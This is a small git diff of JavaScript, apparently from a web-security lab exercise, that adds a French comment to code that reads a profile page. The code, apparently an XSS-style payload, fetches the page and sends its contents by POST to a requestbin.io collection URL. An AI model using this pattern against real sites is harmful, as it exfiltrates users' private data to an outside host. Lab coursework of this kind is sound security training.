@@ -66,7 +66,7 @@ var http = new XMLHttpRequest(); http.open("POST", "https://requestbin.io/1i1r4x
 var http1 = new XMLHttpRequest();
 http1.open("GET", "https://labosecuipl.alwaysdata.net/21/s07/ex2b/profile/", true);
 
-http1.onload = () => {
+http1.onload = () => { // Cette requet ci c'est lancé apres http1
     var http = new XMLHttpRequest();
     http.open("POST", "https://requestbin.io/1i1r4xf1", true);
     http.send(http1.response)
